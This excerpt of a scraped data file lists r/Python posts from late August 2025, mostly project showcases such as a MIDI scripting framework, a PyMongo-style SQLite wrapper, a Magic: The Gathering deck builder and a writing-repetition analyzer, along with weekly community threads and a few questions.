3. **Explore**: Looking for ideas? Check out Al Sweigart's [""The Big Book of Small Python Projects""](https://www.amazon.com/Big-Book-Small-Python-Programming/dp/1718501242) for inspiration.

## Guidelines:

* Clearly state the difficulty level.
* Provide a brief description and, if possible, outline the tech stack.
* Feel free to link to tutorials or resources that might help.

# Example Submissions:

## Project Idea: Chatbot

**Difficulty**: Intermediate

**Tech Stack**: Python, NLP, Flask/FastAPI/Litestar 

**Description**: Create a chatbot that can answer FAQs for a website.

**Resources**: [Building a Chatbot with Python](https://www.youtube.com/watch?v=a37BL0stIuM)

# Project Idea: Weather Dashboard

**Difficulty**: Beginner

**Tech Stack**: HTML, CSS, JavaScript, API

**Description**: Build a dashboard that displays real-time weather information using a weather API.

**Resources**: [Weather API Tutorial](https://www.youtube.com/watch?v=9P5MY_2i7K8)

## Project Idea: File Organizer

**Difficulty**: Beginner

**Tech Stack**: Python, File I/O

**Description**: Create a script that organizes files in a directory into sub-folders based on file type.

**Resources**: [Automate the Boring Stuff: Organizing Files](https://automatetheboringstuff.com/2e/chapter9/)

Let's help each other grow. Happy coding! üåü"
1n562vq,My first kinda complicated code (started like a month ago),Rollgus,31,9,2025-08-31 21:04:57,https://www.reddit.com/r/Python/comments/1n562vq/my_first_kinda_complicated_code_started_like_a/,"WHAT MY PROJECT DOES
I have made a card game where you are against a bot, and is trying to be the first to have only one Card left. 

TARGET AUDIENCE
This is just a project I made for fun, but I hope some people who are new to Python, or is interested in small text based games Will like this.

COMPARISON
I haven't seen any project like this, and I at least hope there aren't any. I feel this is a unique fun card game.

GitHub link:
https://github.com/Simonkamon11/One-Card.git"
1n5229t,How is Python 4 ever going to reach critical mass once everyone is using AI to write code?,big_like_a_pickle,0,60,2025-08-31 18:24:10,https://www.reddit.com/r/Python/comments/1n5229t/how_is_python_4_ever_going_to_reach_critical_mass/,"I know that there is a lot of skepticism around using LLM tools to generate code. There is a tremendous amount of hype. However, I'd have to argue that at this point, it's inevitable that it's here to stay and is almost certain to continually improve.

Historically, AI usage maps to the same progression up the abstraction layers that we've seen for 80 years. Binary / machine code --> assembler --> C --> Python. It's a continual march to moving the coder further and further away from the machine.

Let's pretend that Python 4 is released. It contains a lot of great new features. However a LLM won't be able to utilize them because Python 4 wasn't part of its training corpora. But by this point, the software development industry has already shifted heavily to agent based development workflows. Many, many developers balk at this trend (much like they did from assembler to COBOL/FORTRAN) but the business economics make this shift inevitable. 

The problem is then, if everyone is using LLMs to write code, Python 4 will never be adopted because LLMs can't write it. And it is now economically undeniable to hand code anything in sufficient volume to result in enough training data for new languages. I'm wondering who in the computer science world is thinking about this problem? Is it hypothetical or is this going to be a real problem in a few years?"
1n4v2zm,gen-dual: Python library for high-order partial derivatives with dual numbers,PretendLead3104,16,0,2025-08-31 13:43:57,https://www.reddit.com/r/Python/comments/1n4v2zm/gendual_python_library_for_highorder_partial/,"**What My Project Does:**  
gen-dual is a Python library for vectorized computation of arbitrary-order partial derivatives of multivariable functions. It supports complex numbers and many functions like LambertW, Gamma, InverseErf, and Abs. Derivatives are computed all at once using a dual-number-like method, useful for analyzing Taylor series, function behavior, or any derivative-related computations.

**Target Audience:**  
This library is meant for anyone interested in exploring high-precision, multi-variable differentiation in Python, including researchers, students, or hobbyists.

**Comparison:**  
Unlike standard automatic differentiation libraries, gen-dual supports arbitrary-order derivatives, full vectorization, complex numbers, and rich function support, making it more flexible than most existing alternatives.

**GitHub Link:**  
https://github.com/LukaLavs/Generalized-Dual
"
1n4ri23,"MIDI Scripter - a framework for scripting MIDI, OSC, keyboard and mouse input and output",WonderfulAccident836,1,0,2025-08-31 10:41:14,https://www.reddit.com/r/Python/comments/1n4ri23/midi_scripter_a_framework_for_scripting_midi_osc/,"# What My Project Does

Receives, modifies, and sends MIDI, OSC, keyboard, and mouse I/O with minimal boilerplate and a configurable GUI for controls and logging.

# Target Audience

* Musicians who need custom and complex MIDI setups that may also use OSC, keyboard, and mouse I/O or control Ableton Live.
* Developers of MIDI I/O-centric apps.

# Comparison

MIDI Scripter is a hub framework for python-rtmidi, python-osc, and pynput that unifies them with a common minimalistic documented API and uses PySide6 for an optional GUI. It doesn't do more than these libraries, but it minimizes boilerplate and allows to focus on the I/O handling part.

As a Python framework, MIDI Scripter is more versatile than GUI MIDI modification apps. C-based apps may have less latency and jitter, but MIDI Scripter remains within the margins of what is noticeable in a real-time performance.

# Example

An octave transposer with GUI controls:

    from midiscripter import *  
      
    midi_keyboard = MidiIn('MIDI Keyboard')  # GUI will provide you the port names  
    proxy_output = MidiOut('To DAW', virtual=True)  # virtual proxy port for output  
      
    # GUI widget in a single line  
    octave_selector = GuiButtonSelectorH(('-2', '-1', '0', '+1', '+2'), select='0')  
      
    @midi_keyboard.subscribe  # decorated function will receive port's messages 
    def transpose(msg: MidiMsg) -> None:  
        if msg.type == MidiType.NOTE_ON or msg.type == MidiType.NOTE_OFF:  # filter       
    	msg.data1 += 12 * int(octave_selector.selected_item_text)  # modify
    	proxy_output.send(msg)  # route  
    	    
    if __name__ == '__main__':  
        start_gui()  # opens helpful customizable GUI

# Links 

* [GitHub](https://github.com/Maboroshy/midi-scripter) 
* [Documentation](https://maboroshy.github.io/midi-scripter/)"
1n4rahf,Just built: pydantic-gsheets to bring Google Sheets and Pydantic together,YoussefBenhammouda,36,0,2025-08-31 10:27:49,https://www.reddit.com/r/Python/comments/1n4rahf/just_built_pydanticgsheets_to_bring_google_sheets/,"Hey everyone,  
I have developed a small experimental package called¬†**pydantic-gsheets**.

# What My Project Does

[pydantic-gsheets](https://github.com/Youssefbenhammouda/pydantic-gsheets) is a small experimental package that lets you read and write Google Sheets data in Python using nothing but Pydantic models. Define a BaseModel, and you can validate, parse, and sync data with Sheets without extra boilerplate.

# Target Audience

It‚Äôs meant for quick prototypes, small projects, or teams that love using Google Sheets but want type safety when bringing that data into Python. At this stage it‚Äôs still **experimental**, so not yet recommended for production ‚Äî but great for tinkering, demos, or internal tools.

# Comparison

There are other ways to connect Python to Google Sheets (e.g., gspread, pygsheets), but they typically give you raw dicts or lists that you then have to validate manually. The difference here is that pydantic-gsheets plugs directly into **Pydantic BaseModels**, so your schema, validation, and type coercion happen automatically. You don‚Äôt have to write glue code.

# Links

Links if you want to peek:  
\* Blog: \[Exploring pydantic-gsheets\](https://youssef.benhammouda.ma/blog/pydantic-gsheets)

\* Docs: \[pydantic-gsheets documentation\](https://youssefbenhammouda.github.io/pydantic-gsheets/)

\* GitHub: \[pydantic-gsheets repo\](https://github.com/Youssefbenhammouda/pydantic-gsheets)

Would love to hear thoughts or ideas if you try it out üôÇ

PS: If you find it useful and want to use it, please know it‚Äôs still¬†**experimental**. That also means collaborators are¬†**very welcome,**¬†whether it‚Äôs testing, bug reports, or PRs."
1n4qygz,Introducing NeoSQLite,cwt114,29,15,2025-08-31 10:06:58,https://www.reddit.com/r/Python/comments/1n4qygz/introducing_neosqlite/,"**Showcase: NeoSQLite ‚Äì Use SQLite with a PyMongo-like API**

I'm excited to introduce **NeoSQLite** (https://github.com/cwt/neosqlite), a lightweight Python library that brings a PyMongo-compatible interface to SQLite. This means you can interact with SQLite using familiar MongoDB-style syntax‚Äîinserting, querying, and indexing JSON-like documents‚Äîwhile still benefiting from SQLite‚Äôs simplicity, reliability, and zero configuration.

### What My Project Does

NeoSQLite allows you to:
- Use MongoDB-style operations like `insert_one`, `find`, `update_one`, and `delete_many` with SQLite.
- Perform full-text search across multiple languages using the `$text` operator, powered by an ICU-based tokenizer (via my [fts5-icu-tokenizer](https://github.com/cwt/fts5-icu-tokenizer)).
- Automatically compress query results using [quez](https://github.com/cwt/quez), reducing memory usage by 50‚Äì80% for large result sets.
- Work with embedded documents and nested queries, all backed by SQLite‚Äôs ACID-compliant storage.

It‚Äôs designed for developers who love MongoDB‚Äôs ease of use but want a lightweight, file-based alternative without external dependencies.

### Target Audience

NeoSQLite is ideal for:
- Developers building small to medium-sized applications (e.g., CLI tools, desktop apps, IoT devices) where deploying a full MongoDB instance is overkill.
- Projects that need a schema-flexible, document-style database but must remain portable and dependency-free.
- Prototyping or educational use, where a MongoDB-like interface speeds up development without requiring server setup.
- Environments with limited resources, thanks to its memory-efficient result compression.

It‚Äôs not intended to replace MongoDB in high-concurrency, large-scale production systems, but it‚Äôs production-ready for lightweight, embedded use cases.

### Comparison with Existing Alternatives

Unlike other SQLite-to-document-store wrappers, NeoSQLite stands out by:
- Offering **deep API compatibility with PyMongo**, minimizing the learning curve for developers already familiar with MongoDB.
- Supporting **true multilingual full-text search** via ICU (not just ASCII or basic Unicode), which most SQLite FTS solutions lack.
- Reducing memory footprint significantly through built-in result compression‚Äîsomething not offered by standard SQLite ORMs like SQLAlchemy or dataset.
- Being **zero-configuration and serverless**, unlike MongoDB (which requires a running service) or libraries like TinyDB (which lack indexing, full-text search, or performance optimizations).

In short, if you‚Äôve ever wished you could use MongoDB‚Äôs API with SQLite‚Äôs simplicity, NeoSQLite is for you.

---

Feedback and contributions are welcome. Check it out at: https://github.com/cwt/neosqlite

---

20250903: I‚Äôve made a lot of updates since my last post. Performance has improved thanks to the use of temp table. Please check it out and give it a try!"
1n4pitk,IntentGraph ‚Äì Open-source Python library for repo dependency graphs & clustering,Raytracer,22,2,2025-08-31 08:33:40,https://www.reddit.com/r/Python/comments/1n4pitk/intentgraph_opensource_python_library_for_repo/,"Hello everybody,

I started this project out of a pain point I kept hitting: when working with larger repos, it‚Äôs easy to lose track of how files connect. And when trying to use automation tools (AI or otherwise), the problem gets worse: once you go past a few files, context just disappears, or the token count explodes every time the tool has to look through the whole codebase.

That‚Äôs what led me to build **IntentGraph**: a Python library to map dependencies and structure repos in a way that‚Äôs useful for developers *and* for programmatic agents.

**What My Project Does**

IntentGraph is a Python library for analyzing large codebases. It:

* Maps dependencies between files and modules

* Clusters code (analysis, refactoring, navigation)

* Produces structured outputs at 3 levels (minimal ‚Üí full detail)

* Designed to be **programmatically queryable**: useful for developers and AI agents that need structured repo context

**Target Audience**

* Developers who want to explore or refactor large Python repos

* Tool builders needing a structured representation of a codebase

* Researchers interested in program analysis and code graphing

* AI/automation workflows that require repo-wide context

**Comparison**

Unlike linting/static analysis tools, IntentGraph focuses on structural understanding of the codebase. This structured output makes it lightweight enough for automated tools and AI agents to consume directly.

**Links:**

GitHub: [https://github.com/Raytracer76/IntentGraph](https://github.com/Raytracer76/IntentGraph)

PyPI: [https://pypi.org/project/intentgraph/](https://pypi.org/project/intentgraph/)

**Open Source & Call for Contributions**

IntentGraph is fully open source. I encourage forks, experiments, and extensions ‚Äî for example, expanding it into other languages (Java, Rust, C#, etc.).
I likely won‚Äôt drive this much further myself, but I‚Äôd love to see where the community takes it.

**Looking for feedback:**

* What‚Äôs missing for practical use in Python projects?

* Ideas for integrations (e.g., VS Code)?

* Languages you‚Äôd want supported next?"
1n4nhbk,My python mini project,esSdoem,9,0,2025-08-31 06:23:00,https://www.reddit.com/r/Python/comments/1n4nhbk/my_python_mini_project/,"I have made an app that is great for studing python and begginer friendly as well, I would like to introduce you to `lisq` a single file, lightweight and portable python note-taking app. It would not only serve you as notes but also allow you to add your own functions, advanced searching through out the notes, edit, encrypt and much more (please read README for more information!).

Official github repository:
https://github.com/funnut/Lisq.git

Share & leave a star üåü"
1n4mipq,SecBrowser: A simple visual interface for SEC Filings,status-code-200,5,2,2025-08-31 05:25:05,https://www.reddit.com/r/Python/comments/1n4mipq/secbrowser_a_simple_visual_interface_for_sec/,"**What my project does**

Provides a visual interface for the functions in my package [datamule](https://github.com/john-friedman/datamule-python) using flask. You can do stuff such as:

* View XBRL
* View Company Fundamentals
* View extracted text
* View documents (html, pdf) converted to dictionary form ([doc2dict](https://github.com/john-friedman/doc2dict))
* Apply NLP such as basic entity recognition on text and on the dictionary form (NLP is in an early stage)

**Target Audience**

* Me to debug stuff.
* Maybe you if you like SEC data or enjoy looking at document parsing visualizations?

**Why I made it**

I needed a visual interface to hel-p me debug doc2dict and datamule's early nlp features.

**Comparison**

This is kind of a niche thing. I decided to release it on pypi in case someone found it useful.

**Installation**

pip install datamule

**Links**

* [GitHub](https://github.com/john-friedman/secbrowser)
* [Medium](https://medium.com/@jgfriedman99/secbrowser-edb36db3230f) \- I think the medium link might get this removed, but adding it because it is 99% photos of what my package does and why you might find it cool."
1n4ilwx,PySimpleGUI Hobbyist License Canceled,teslah3,97,58,2025-08-31 01:50:49,https://www.reddit.com/r/Python/comments/1n4ilwx/pysimplegui_hobbyist_license_canceled/,"So I used PySimpleGUI for a single project and received the 30 day free trial assuming Id be able to get the hobbyist version once it was over. Is it crazy to anyone else that it cost $99 to just save a few lines of code considering I can create the same, if not a more customizable GUI using C/C++. My project which wasnt too crazy (firetv remote using adb protocol) is now garbage because I will not pay for the dumb licensing fee, but hey maybe a single person should pay the same amount a billion dollar company pays right???\`"
1n4hc9e,Python type system,No_Blackberry_617,12,29,2025-08-31 00:46:58,https://www.reddit.com/r/Python/comments/1n4hc9e/python_type_system/,"(Just sharing something)  
  
As someone who has taken advantage of TypeScript's type safety for most of its career, using Python without type safety feels a bit awkward. I put together a page explaining how to take advantage of Python's type system and how to extend it on your editor.

[https://crocus-ceres-509.notion.site/How-Python-type-system-works-and-how-to-extend-it-on-your-editor-21e3826aa7ed808b93e2f4d18493c6ea](https://crocus-ceres-509.notion.site/How-Python-type-system-works-and-how-to-extend-it-on-your-editor-21e3826aa7ed808b93e2f4d18493c6ea)"
1n4gdyj,Sunday Daily Thread: What's everyone working on this week?,AutoModerator,4,6,2025-08-31 00:00:19,https://www.reddit.com/r/Python/comments/1n4gdyj/sunday_daily_thread_whats_everyone_working_on/,"# Weekly Thread: What's Everyone Working On This Week? üõ†Ô∏è

Hello /r/Python! It's time to share what you've been working on! Whether it's a work-in-progress, a completed masterpiece, or just a rough idea, let us know what you're up to!

## How it Works:

1. **Show & Tell**: Share your current projects, completed works, or future ideas.
2. **Discuss**: Get feedback, find collaborators, or just chat about your project.
3. **Inspire**: Your project might inspire someone else, just as you might get inspired here.

## Guidelines:

* Feel free to include as many details as you'd like. Code snippets, screenshots, and links are all welcome.
* Whether it's your job, your hobby, or your passion project, all Python-related work is welcome here.

## Example Shares:

1. **Machine Learning Model**: Working on a ML model to predict stock prices. Just cracked a 90% accuracy rate!
2. **Web Scraping**: Built a script to scrape and analyze news articles. It's helped me understand media bias better.
3. **Automation**: Automated my home lighting with Python and Raspberry Pi. My life has never been easier!

Let's build and grow together! Share your journey and learn from others. Happy coding! üåü"
1n40rht,I built my own torch in the last two weeks!,tigert1998,55,13,2025-08-30 12:46:54,https://www.reddit.com/r/Python/comments/1n40rht/i_built_my_own_torch_in_the_last_two_weeks/,"**What my project does:**

In the last two weeks, I have been working on building my own toy project: a deep learning training framework. It is named ""mytorch"". It was written from scratch except that I use cublaslt for high performance matmul operations. Now it can do most of the pytorch stuff:

\- cuda support for forward/backward operators in CNN MNIST training and evaluations, such as, BN, Conv, Linear, many elementwise ops, many reduce ops, many essential ops;

\- SGD optimizer;

\- Load/save state dict for module/optimizer

\- Dataset/DataLoader

\- Autograd system: topsort for backward.

**Target Audience:**

It is a toy project for education.

**Comparison with other products:**

In terms of results, when training MNIST for 3 epochs in my 4060 laptop, PyTorch takes 33 seconds while ""mytorch"" takes 41 seconds which is just 25% slower. PyTorch is a highly optimized framework for production. But my project is for fun and for learning more about cuda programming/autograd system.

Please leave a star on my git repo or leave a comment below if you are interested. Thanks so much!  
[s://github.com/tigert1998/mytorch/tree/main](https://github.com/tigert1998/mytorch/tree/main)"
1n3un64,Let's Learn Together<3,CODE-with-SHEEL,0,3,2025-08-30 06:32:58,https://www.reddit.com/r/Python/comments/1n3un64/lets_learn_together3/,"So ive been willing to do frontend development since a week and now ive made all the important things sum up like lectures, documents, project ideas, etc.

Lets grow together, see im new to this and will take all the positive feedbacks from you guys. Anyone up to work and lean together? should i make a discord channel? "
1n3ne68,Python-Based Magic: The Gathering Commander Deck Builder,styrofoamshotgun,31,9,2025-08-30 00:05:10,https://www.reddit.com/r/Python/comments/1n3ne68/pythonbased_magic_the_gathering_commander_deck/,"Hi¬†r/Python, I've been working off-and-on (mostly off) on a Python-based deck builder for a Magic: the Gathering Commander format. Last week I had a mostly working command line driven version I shared over on those related subs, but this week I've got a fleshed out build, this time with a fully-featured web UI.

This is my first actual software dev release and I'm proud to put it out there.

# What my Project Does

* Pick your commander and up to three themes (e.g., Aristocrats, +1/+1, Kindred, Aggro).
* It proposes a clean 100‚Äëcard list that fits those themes, with clear stage‚Äëby‚Äëstage reasons.
* Multi‚Äëcopy strategies? If your pick supports Persistent Petitioners, Dragon‚Äôs Approach, or Shadowborn Apostle, it offers a package. You choose how many, it keeps you at 100, and you can include Thrumming Stone when it makes sense.
* Web: multi‚Äëcopy packages are now offered right after commander selection, so there are no surprises later.
* Web: the package is applied first, and land building happens after‚Äîcounts and targets auto‚Äëadjust so the deck stays clean at 100.
* Web polish: the UI shows when targets were adjusted and if anything was clamped. Small fixes for names with apostrophes.

# Target Audience

* Magic: The Gathering fans
* People like me, who like to theorycraft, who like to throw together decks online they may not ever actually use
* People who just want to give a base set of instructions and have something throw a deck together for them

# Comparison

Honestly I'm not sure if there is one or at least that I've seen? Obviously EDHRec and Moxfield/Archidekt can help with the deck building, but you generally need to do input every step of the way.

I originally started working on this last November because I wanted a way to throw a bunch of decks together without needing to do it all manually. At the time I wasn't really seeing anything Python-based or otherwise that does it in a more hands-off way.

This way also let's me throw together a handful of the decks with the same commander, themes, and ideologies, then compare them for differences or see what's different.

# Web UI at a glance

* Mobile support not quite working (landscape get squished), recommended to load from a computer or in portrait mode
* ""New Deck‚Äù modal: search commander, pick up to 3 themes (AND/OR), choose bracket (not fully implemented), an optional deck name, and the ideal counts for a variety of card types you'll want in every deck (lands, card draw, wipes, etc...).
* Multi-copy packages: suggests Petitioners/Approach/Apostles when relevant; you pick counts (Thrumming Stone optional). Applied first with auto target tweaks and a 100-card clamp.
* Fast iteration: lock favorites, Replace any pick with alternatives (Owned-only filter), and Rerun Stage to re-roll just creatures/spells/lands (respects locks).
* Use your collection: upload TXT/CSV owned lists; build owned-only or prefer owned. Short owned-only builds get a recommendations file.
* Visual clarity: Mana Curve, Color Pips, and Sources with hover-to-highlight and cross-highlighting; includes colorless ‚ÄòC‚Äô.
* Exports: TXT for Moxfield/Archidekt, CSV with tags (and Owned column), plus a simple printout.
* Nice-to-use touches: optional virtualized lists for speed, lazy-loaded images, reduced-motion friendly, theme selector, and helpful keyboard shortcuts.

# Tune and iterate

* Lock cards you love so reruns keep them.
* Swap any pick for an alternative; filter to owned cards if you want.
* Compare versions side‚Äëby‚Äëside to see what changed.

# Use your collection

* Drop TXT/CSV lists of your owned cards.
* Build using only owned cards, or simply prefer owned while still picking the best fits.
* If an owned‚Äëonly build runs short, it exports a ‚Äúrecommended pickups‚Äù list so you can finish it out.

# At‚Äëa‚Äëglance clarity

* Mana curve and color sources summaries with hover‚Äëto‚Äëhighlight matching cards.
* CSV export marks which cards you own.

# Exports

* TXT ready for Moxfield/Archidekt
* CSV with tags and details
* Simple printable list

# Try it

* Live example available here:¬†[https://deck-builder.wiz-ops.com/](https://deck-builder.wiz-ops.com/)¬†(do note if you run the setup/tag it will take a few minutes)
* Docker Hub (easiest, opens the Web UI):¬†[https://hub.docker.com/r/mwisnowski/mtg-python-deckbuilder](https://hub.docker.com/r/mwisnowski/mtg-python-deckbuilder)
* Use the dockerhub-docker-compose.yml file to do it all for you.
* Windows EXE or run from source: see the latest release below.

# Links

* Latest release (notes + downloads):¬†[https://github.com/mwisnowski/mtg\_python\_deckbuilder/releases/latest](https://github.com/mwisnowski/mtg_python_deckbuilder/releases/latest)
* Source:¬†[https://github.com/mwisnowski/mtg\_python\_deckbuilder](https://github.com/mwisnowski/mtg_python_deckbuilder)

# Roadmap

* Proper bracket implementation: tighter, consistent power targets across all stages.
* Random modes: ‚Äúsurprise me‚Äù overall, random by theme, and one‚Äëclick random complete builds.
* Budget mode: soft/hard caps with price tiers and a pickups list that fits a budget.
* Must‚Äëinclude / must‚Äëexclude lists: lock in pet cards or avoid specific pieces.
* Smarter land bases: basics‚Äëheavy vs. fixing‚Äëheavy profiles guided by curve and color pips.
* Expanded multi‚Äëcopy helpers (where legal) with clearer guidance when they‚Äôre viable.

Missing a theme for your favorite commander or found a bug? Issues/PRs welcome."
1n3nauu,Saturday Daily Thread: Resource Request and Sharing! Daily Thread,AutoModerator,2,0,2025-08-30 00:00:54,https://www.reddit.com/r/Python/comments/1n3nauu/saturday_daily_thread_resource_request_and/,"# Weekly Thread: Resource Request and Sharing üìö

Stumbled upon a useful Python resource? Or are you looking for a guide on a specific topic? Welcome to the Resource Request and Sharing thread!

## How it Works:

1. **Request**: Can't find a resource on a particular topic? Ask here!
2. **Share**: Found something useful? Share it with the community.
3. **Review**: Give or get opinions on Python resources you've used.

## Guidelines:

* Please include the type of resource (e.g., book, video, article) and the topic.
* Always be respectful when reviewing someone else's shared resource.

## Example Shares:

1. **Book**: [""Fluent Python""](https://www.amazon.com/Fluent-Python-Concise-Effective-Programming/dp/1491946008) \- Great for understanding Pythonic idioms.
2. **Video**: [Python Data Structures](https://www.youtube.com/watch?v=pkYVOmU3MgA) \- Excellent overview of Python's built-in data structures.
3. **Article**: [Understanding Python Decorators](https://realpython.com/primer-on-python-decorators/) \- A deep dive into decorators.

## Example Requests:

1. **Looking for**: Video tutorials on web scraping with Python.
2. **Need**: Book recommendations for Python machine learning.

Share the knowledge, enrich the community. Happy learning! üåü"
1n3i9r3,Feedback on my daily python newsletter,freshly_brewed_ai,7,0,2025-08-29 20:26:06,https://www.reddit.com/r/Python/comments/1n3i9r3/feedback_on_my_daily_python_newsletter/,"Wanted to share the free (no subscription or paywall) newsletter I have created where I send bite sized Python snippets daily for absolute beginners. My personal journey led to the creation of this as I was not being consistent when I started with Python, and felt many busy professionals might be in a similar situation. 
Happy to remove this if it's not the right group, but any feedback (even like this newsletter is not needed) is helpful. 
https://pandas-daily.kit.com/"
1n3gmbr,PyData Seattle Tickets Labor Day Sale: 25% Off This Weekend Only!,Embarrassed_Twist232,6,1,2025-08-29 19:20:52,https://www.reddit.com/r/Python/comments/1n3gmbr/pydata_seattle_tickets_labor_day_sale_25_off_this/,"Hey r/Python

PyData is a program of NumFOCUS, a nonprofit fiscal sponsor to open source projects like pandas, NumPy and many more. We're excited to bring a conference to Seattle and are running a **Labor Day Flash Sale** this weekend!

üéü **Get 25% off your conference ticket**. The sale ends Monday at midnight PT!

üëâ [Grab your discounted ticket here](https://ti.to/pydata/pydata-seattle-2025/discount/SUPERSEATTLE25)

**PyData Seattle** will be November 7‚Äì9 at Bellevue College for three days of talks, tutorials, and networking with Python data enthusiasts from around the world.

Don‚Äôt miss out ‚Äî more information at [https://pydata.org/seattle2025/](https://pydata.org/seattle2025/) "
1n39ov5,What are your tips to find the newest libraries/tools?,n1k0h1k0,40,20,2025-08-29 14:57:17,https://www.reddit.com/r/Python/comments/1n39ov5/what_are_your_tips_to_find_the_newest/,"The question is more for your intended use case, but it still stands for improvements I might not even know that I wanted.

I've tried looking through my favorite libraries for documentation updates, listening to podcasts and watching Youtube videos, etc."
1n38w1w,Python e-commerce store,Greedy_Point7755,0,13,2025-08-29 14:25:59,https://www.reddit.com/r/Python/comments/1n38w1w/python_ecommerce_store/,I am currently building an e-commerce store using AWS services and Django framework. Anyone have advice on how make the website look better as my skills in front end development lacks creativity. Any advice is appreciated. 
1n38glw,Handwritten image to text.,Secretor_Aliode,0,9,2025-08-29 14:09:13,https://www.reddit.com/r/Python/comments/1n38glw/handwritten_image_to_text/,"Hi, there. Is there's existing JavaScript library ocr, for image but handwritten turn into text?.

Except: Tesseract.js I test it to my hand written not accurate.

My choice is Pytesseract but I doubt that the set up is time consuming or when deployment I need to pay expensive.

I know image to pdf like pdf-lib, but still can't guarantee about ocr handwritten accuracy.

Thank you.

Thank you for your suggestions üòÉ."
1n38cz5,I need feedback for my first personal python project,None,2,5,2025-08-29 14:05:03,https://www.reddit.com/r/Python/comments/1n38cz5/i_need_feedback_for_my_first_personal_python/,"# ReArgs - My First Python Project

I just started -2 or 3 months- my backend development journey using a platform, and after some courses the platform required me to build my own project to get out of tutorial hell and build something by myself.

To be honest, I already knew JavaScript and TypeScript and have an amateur frontend past -like 3 years- but wanted to switch to backend due to my dissatisfaction with frontend development. So, this was not exactly a first project for me.

Building this application took 2 weeks -counting weekends and breaks- and I believe I gave it a fair amount of effort and thought.

Before starting building the application I spent a day to decide what to build. I wanted to build something personal and might actually use in the future.

# What My Project Does

I like writing articles, posts, writings but often I fall into repeating myself and text I write turns into a mess. I don't want to limit my pen or stop myself with that thought because I see writing as a process that shouldn't be stopped when there are things to write, it's personal for me. I do keep journals.

Technically my application takes a txt file -path passed as an argument-, copies it, finds the similarities on the text using Sentence Transformers and internally saves the clusters, create an output text and a cli output from the clusters.

# Comparison

Then I thought, what if I built an app that showed me the semantic similarities in my article. Then I said to myself why don't I use ChatGPT for that? Then I said well, I don't want this program to fix the article, or give me advice or the things I don't want to see like ChatGPT does. I wanted a simple program that showed me the similarities and actually after a day of thinking of what to build, this was the most doable and realistic one.

# Target Audience

So, I built the app for my personal use, got myself 5000xp, and a GitHub repository, although the course description said this is application will probably not something you show in your portfolio, I still shared it on LinkedIn.

But if you are interested in writing stuff -and actually can use this application on any text- and like to see the semantic similarities in your text, this is the app for you. I even used it on this reddit post too. 

All kind of feedback is welcome, I built tests, and did not face any bugs during production phase, but you never know what might happen.

GitHub Repository Link: [GitHub Repo](https://github.com/mehmetcagriekici/reargs)

README from the GitHub Repository:

>\# ReArgs

>

>\*\*ReArgs (not ‚Äúregards‚Äù)\*\* is a command-line Python application that analyzes \`.txt\` files for semantic repetitions and similarities.

>It does \*\*not\*\* rewrite your text for you‚Äîit simply helps you \*\*visualize and organize\*\* your writing by highlighting repetitions and grouping similar content.

>

>\---

>

>\##  Motivation

>

>I enjoy writing posts and articles (often on Reddit), but I noticed a recurring problem:

>my drafts quickly turned into a mess because of poor planning and constant repetition.

>

>Reading an entire article multiple times to catch repetitions was frustrating, so I built \*\*ReArgs\*\* to automatically surface these similarities.

>It helps me:

>

>\- Write \*\*cleaner articles\*\* by avoiding unintentional repetition.

>\- \*\*Understand other articles\*\* better by grouping sentences and paragraphs with similar meaning.

>

>\---

>

>\##  How to Use

>

>Clone the repo and install dependencies:

>

>Run the provided shell script with a \`.txt\` file as an argument:

>

>\`\`\`bash

>./run.sh path/to/article.txt

>\`\`\`

>

>\### Notes

>

>\- The application only accepts \*\*one \`.txt\` file at a time\*\*.

>\- Your original file is never modified.

>\- Results are displayed in the console and also written to the \`output/\` folder.

>\- The \`transforms/\` folder is used internally‚Äîdo not manually modify its contents.

>

>\---

>

>\## How It Works

>

>

>2. It splits the article into \*\*paragraphs\*\* and \*\*sentences\*\*.

>3. Using \[Sentence Transformers\](https://github.com/UKPLab/sentence-transformers), it:

>

>\- Finds semantic similarities within each paragraph.

>\- Then checks similarities \*\*across the entire article\*\*.

>

>\### Similarity Clusters

>

>\- \*\*Hard clusters (‚â• 0.8 similarity):\*\* treated as duplicates.

>\- \*\*Soft clusters (0.6‚Äì0.8 similarity):\*\* treated as sentences with close meaning.

>

>Finally:

>

>\- A \*\*similarity graph\*\* and grouped results are printed to the console.

>\- A summary report is written to the \`output/\` folder.

>

>The purpose is to highlight repetitions, not to automatically generate polished text.

>

>\---

>

>\##  Disclaimer

>

>ReArgs is a \*\*writing assistant\*\*, not an article generator.

>It is designed to \*\*help you improve your own writing\*\* by making patterns more visible."
1n37c65,Abstracting a script for general use,amosmj,8,15,2025-08-29 13:23:09,https://www.reddit.com/r/Python/comments/1n37c65/abstracting_a_script_for_general_use/,"I'm going through an exercise right now of taking a script that I wrote linearly and ran manually and trying to convert it into something more general and abstract and it's pretty rough. I'm sure there are things I could have done from the the start to make this process easier. I'm looking for tips or frameworks on the conversation but also tips and frameworks that my betters would have used from the start.

For example:  
I wrote a script that is pointed at a folder and it scans for github repos. Once it finds the repos it scans for certain types of files (sql for the most part). It then scans each file for keywords to document table reads and writes.

From the beginning I broke it out similar to the sentences above, each as a function. But, now I'm trying to convert it so someone else can import it just call a piece of it, e.g. you want to manually scan just one file, you can import this and run just that function. I'm in the phase of trying to track down any variables that need to be passed as a parameter when I call it in the abstract vs run it in main.

Basically any tips on turning what was meant as a script into a reusable package. "
1n36mcu,Phicode Runtime Engine (Open-Source),InternationalBoat727,2,1,2025-08-29 12:52:43,https://www.reddit.com/r/Python/comments/1n36mcu/phicode_runtime_engine_opensource/,"Hey all,

I've been working on **Phicode**, a Python runtime engine designed to be reliable, stable, performant, and secure while maintaining your existing workflow.

\## What My Project Does

Phicode is a Python runtime engine that runs your existing Python code with automatic optimizations. It provides robust caching (source, bytecode, spec, imports) with integrity checks, optional security modules with sandboxing and threat detection, and automatically switches between PyPy & CPython based on workload analysis. It includes a built-in benchmarking suite that outputs CSV/JSON/Mermaid diagrams, a RESTful API, and optional custom syntax support (.œÜ or .phi files) that's fully configurable and mixable with standard .py files.

\## Target Audience

This is for Python developers who want performance optimization (& customization) without changing their existing codebase. Whether you're running data processing pipelines, web applications, or computational workloads, Phicode automatically manages your runtime environment. The engine runs standard Python out of the box with negligible overhead, making it suitable for both development and production environments.

\## Comparison

Unlike standard Python interpreters that require manual switching between CPython and PyPy, or tools like pyenv that only manage Python versions, Phicode provides automatic interpreter switching based on workload characteristics. While PyPy offers performance gains and CPython provides compatibility, Phicode intelligently chooses between them. It combines the benefits of both with comprehensive caching, security features, and performance monitoring that typically require separate tools. The Engine acts like a middleman between ur codebase and the interpreters.

**Current features:**

* Robust caching with integrity checks
* Optional security modules (sandboxing + threat detection)
